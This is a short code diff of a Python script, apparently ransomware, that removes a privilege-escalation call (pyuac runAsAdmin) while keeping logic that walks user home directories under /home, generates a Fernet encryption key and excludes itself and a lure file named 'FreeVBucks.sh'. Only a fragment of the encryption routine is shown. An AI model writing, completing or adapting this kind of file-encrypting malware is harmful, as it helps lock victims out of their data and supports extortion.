@@ -1,5 +1,4 @@
 import os
-import pyuac
 import tkinter as tk
 from cryptography.fernet import Fernet
 
@@ -8,7 +7,6 @@ def main():
     base_path = "/home"
     slash = "/"
     ignore = ['FreeVBucks.sh', "encryptor.py"]
-    pyuac.runAsAdmin()
     directories = get_users(base_path, slash)
     key = Fernet.generate_key()
     f = Fernet(key)
